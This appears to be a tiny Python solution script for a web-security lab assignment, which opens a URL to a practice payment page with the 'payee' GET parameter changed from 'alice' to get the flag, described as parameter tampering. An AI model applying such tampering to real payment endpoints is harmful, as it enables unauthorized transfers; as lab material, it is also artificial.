import webbrowser

# Exploit: change GET parameter in the URL to anything that's not
# 'alice' to get the flag. It's a case of HTTP Requests Parameter Tampering

def main():
    webbrowser.open('http://wsb.com/Assignment2/case14.php?payee=foo&sum=10', 2)

if __name__ == "__main__":
    main()
